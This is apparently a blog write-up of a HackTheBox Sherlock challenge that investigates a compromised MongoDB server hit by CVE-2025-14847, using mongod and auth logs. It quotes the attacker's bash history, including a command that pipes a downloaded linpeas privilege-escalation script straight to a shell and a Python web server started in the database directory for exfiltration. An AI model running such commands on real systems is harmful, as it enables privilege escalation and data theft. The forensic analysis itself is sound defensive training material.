---
title: CVE-2025-14847, MangoBleed (HTB Sherlock)
date: 2026-3-30 03:00:01 +/-0000
categories: [Education, Write Ups]
tags: [hackthebox, soc, linux, digital forensics, incident response]
author: cblake
description: An analysis on the MongoDB vulnerability, MangoBleed
comments: false
image:
  path: /assets/img/mangobleed/logo.png
  alt: Logo for the MangoBleed write-up.

---

MangoBleed is a HTB sherlock challenge that focuses on a CVE associated with MongoDB that is known as, well, MangoBleed. It's a good challenge for those looking to learn how to analyze various logs on Linux, as well as those wanting to apply some Linux terminal skills.

Scenario:
```
You were contacted early this morning to handle a high-priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vlnerability referred to as mon
```

We are given a Linux system's triage which contains all of the MongoDB information we need.

## What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

Since we are provided a name of the vulnerability, MongoBleed, we can do an easy browser search to find the CVE ID to be `CVE-2025-14847`


## What is the version of MongoDB installed on the server that the CVE exploited?

For this question and for future questions it would be valuable to find and refer to the mongodb logs. We can find the log file at `/uac-mongodbsync-linux-triage/[root]/var/log/mongodb/mongod.log`

Inside of this file, we get logs in a javascript format which we can parse to find the version number.
Here is a log that provides us with "buildInfo" and further provides MongoDB information.

```js
{"t":{"$date":"2025-12-29T05:11:47.713+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
```
Which means our version is `8.0.16`

## Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.

Going through the MongoDB logs, there is only one IP address that takes up the traffic, which means this can be our only option for an attacker. The IP address is `65.0.76.43`.

## Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)
Knowing that we will use the MongoDB logs to answer this question, and that we already have a malicious IP associated with the attacker, we can search for the first entry related to the attacker's IP. Our earliest confirmed event from the malicious IP was found in this log entry.
```js
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":1}}
```
Which makes our time `2025-12-29 05:25:52`

## Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

Since all of these logs are associated with connections, we can use a bash command to count however many times the attacker's IP address comes up. Using a combination of `grep` and `wc` we can get our answer:
```bash
grep -o "65.0.76.43" mongod.log | wc -l
75260
```
Which shows our answer to be `75260`

## The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
For this question, the hint tells us to search in `/var/log/auth.log`. To narrow our search down even further, we know that the attacker makes their first attempts at `2025-12-29 05:25:52`, so we can focus on times later than that. When looking through this file we see a massive section of failures from the numerous brute force attempts, however towards the end we cam spot an entry that says the attacker's ip address was accepted.
```js
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
```
Making our time `2025-12-29 05:40:03`

## Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

When it comes to command execution on Linux, an easy place to check would be the bash history. So navigate to the hijacked user's directory `/uac-mongodbsync-linux-triage/[root]/home/mongoadmin` and output the `.bash_history contents.`

```bash
cat .bash_history
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```
We see a well known privesc script known as linpeas, which it's retrieval command is the one we are looking for.

``` bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
Looking at the previous question's answer, within the bash history we can tell that the python web server was opened when the attacker was within the `/var/lib/mongodb/` directory, which would be our answer.
